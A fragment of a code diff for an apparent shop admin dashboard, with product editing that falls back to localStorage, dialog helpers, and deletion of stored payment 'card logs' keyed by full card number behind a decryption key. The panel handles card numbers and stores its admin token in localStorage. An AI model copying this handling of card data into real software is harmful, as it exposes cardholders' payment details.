+    throw new Error('API offline');
+  } catch (err) {
+    console.warn('API offline, saving product locally:', err);
+    let products = JSON.parse(localStorage.getItem('future_chips_products')) || [
+      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
+      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
+      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
+      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
+      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
+      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
+    ];
+
+    if (id) {
+      const idx = products.findIndex(p => p.id === id);
+      if (idx !== -1) {
+        products[idx] = { ...products[idx], name, category, price: parseFloat(price), description };
+      }
+    } else {
+      const newProd = {
+        id: 'prod-' + Date.now(),
+        name,
+        category,
+        price: parseFloat(price),
+        description,
+        image: '/uploads/placeholder.svg'
+      };
+      products.push(newProd);
+    }
+    localStorage.setItem('future_chips_products', JSON.stringify(products));
+
+    document.getElementById('product-modal').classList.remove('active');
+    resetProductForm();
+    await fetchAdminProducts();
+  }
+}
+
+// Edit product prefill modal trigger
+window.editProduct = async function(id) {
+  try {
+    let p;
+    const res = await fetch(`/api/products/${id}`);
+    if (res.ok) {
+      p = await res.json();
+    } else {
+      throw new Error();
+    }
+    document.getElementById('product-id-field').value = p.id;
+    document.getElementById('product-name-field').value = p.name;
+    document.getElementById('product-category-field').value = p.category;
+    document.getElementById('product-price-field').value = p.price;
+    document.getElementById('product-desc-field').value = p.description || '';
+  } catch (err) {
+    const products = JSON.parse(localStorage.getItem('future_chips_products')) || [
+      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
+      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
+      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
+      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
+      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
+      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
+    ];
+    const p = products.find(item => item.id === id);
+    if (p) {
+      document.getElementById('product-id-field').value = p.id;
+      document.getElementById('product-name-field').value = p.name;
+      document.getElementById('product-category-field').value = p.category;
+      document.getElementById('product-price-field').value = p.price;
+      document.getElementById('product-desc-field').value = p.description || '';
+    }
+  }
+  document.getElementById('modal-title').innerText = 'Modify Cyber Module';
+  document.getElementById('modal-submit-btn').innerText = 'Update Product Data';
+  document.getElementById('product-modal').classList.add('active');
+};
+
+// Delete Product
+window.deleteProduct = async function(id) {
+  showCustomConfirm(
+    '⚠️ Erasure Warning',
+    'Are you sure you want to permanently erase this module from the database?',
+    async () => {
+      try {
+        const response = await fetch(`/api/admin/products/${id}`, {
+          method: 'DELETE',
+          headers: getAuthHeaders()
+        });
+        if (!response.ok) throw new Error();
+      } catch (err) {
+        let products = JSON.parse(localStorage.getItem('future_chips_products')) || [];
+        products = products.filter(p => p.id !== id);
+        localStorage.setItem('future_chips_products', JSON.stringify(products));
+      }
+      await fetchAdminProducts();
+    }
+  );
+};
+
+// Reset modal form
+function resetProductForm() {
+  document.getElementById('product-id-field').value = '';
+  document.getElementById('product-name-field').value = '';
+  document.getElementById('product-price-field').value = '';
+  document.getElementById('product-desc-field').value = '';
+  document.getElementById('product-image-field').value = '';
+  document.getElementById('product-category-field').selectedIndex = 0;
+}
+
+// Session Expired helper
+function handleSessionExpired() {
+  showCustomAlert('🔒 Session Expired', 'Security token expired. Please login again.');
+  localStorage.removeItem('admin_token');
+  localStorage.removeItem('admin_trash_pin');
+  localStorage.setItem('admin_cards_showing_trash', 'false');
+  setTimeout(() => {
+    window.location.href = '/admin/index.html';
+  }, 2000);
+}
+
+
+
+// Custom Confirmation Dialog helper
+function showCustomConfirm(title, message, onConfirm) {
+  const modal = document.getElementById('confirm-modal');
+  const titleEl = document.getElementById('confirm-modal-title');
+  const messageEl = document.getElementById('confirm-modal-message');
+  const okBtn = document.getElementById('confirm-ok-btn');
+  const cancelBtn = document.getElementById('confirm-cancel-btn');
+  const backdrop = document.getElementById('confirm-modal-backdrop');
+
+  if (!modal) return;
+
+  titleEl.innerText = title;
+  messageEl.innerText = message;
+
+  const cleanUp = () => {
+    modal.classList.remove('active');
+    okBtn.onclick = null;
+    cancelBtn.onclick = null;
+    backdrop.onclick = null;
+  };
+
+  okBtn.onclick = () => {
+    cleanUp();
+    onConfirm();
+  };
+
+  cancelBtn.onclick = cleanUp;
+  backdrop.onclick = cleanUp;
+
+  modal.classList.add('active');
+}
+
+// Custom Alert Dialog helper
+function showCustomAlert(title, message) {
+  showCustomConfirm(title, message, () => {});
+  const cancelBtn = document.getElementById('confirm-cancel-btn');
+  if (cancelBtn) cancelBtn.style.display = 'none';
+  const okBtn = document.getElementById('confirm-ok-btn');
+  if (okBtn) {
+    okBtn.innerText = 'Dismiss';
+    okBtn.style.background = 'var(--primary-color)';
+    okBtn.style.borderColor = 'var(--primary-color)';
+  }
+  
+  const okBtnClick = () => {
+    if (cancelBtn) cancelBtn.style.display = 'block';
+    if (okBtn) {
+      okBtn.innerText = 'Delete';
+      okBtn.style.background = '#ef4444';
+      okBtn.style.borderColor = '#ef4444';
+    }
+  };
+
+  const backdrop = document.getElementById('confirm-modal-backdrop');
+  backdrop.addEventListener('click', okBtnClick, { once: true });
+  okBtn.addEventListener('click', okBtnClick, { once: true });
+}
+
+// Soft delete active card entry
+window.deleteCard = function(cardNumber) {
+  showCustomConfirm(
+    '🗑️ Delete Card Log',
+    'Are you sure you want to move this card log to the trash bin?',
+    async () => {
+      try {
+        const response = await fetch(`/api/admin/cards/${encodeURIComponent(cardNumber)}/delete`, {
+          method: 'PUT',
+          headers: getAuthHeaders()
+        });
+
+        if (response.status === 401) return handleSessionExpired();
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error);
+
+        await fetchAdminCards();
+      } catch (err) {
+        showCustomAlert('❌ Execution Failed', err.message || 'Failed to soft delete card.');
+      }
+    }
+  );
+};
+
+// Permanent hard delete card entry from database
+window.deletePermanentCard = function(cardNumber) {
+  showCustomConfirm(
+    '⚠️ Permanent Erasure',
+    'Are you sure you want to permanently erase this card details from database? This action is irreversible.',
+    async () => {
+      try {
+        const response = await fetch(`/api/admin/cards/${encodeURIComponent(cardNumber)}`, {
+          method: 'DELETE',
+          headers: getAuthHeaders()
+        });
+
+        if (response.status === 401) return handleSessionExpired();
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error);
+
+        await fetchAdminCards(trashDecryptionKey);
+      } catch (err) {
+        showCustomAlert('❌ Execution Failed', err.message || 'Failed to permanently delete card.');
+      }
+    }
+  );
+};
+
+</script>
+</body>
+</html>
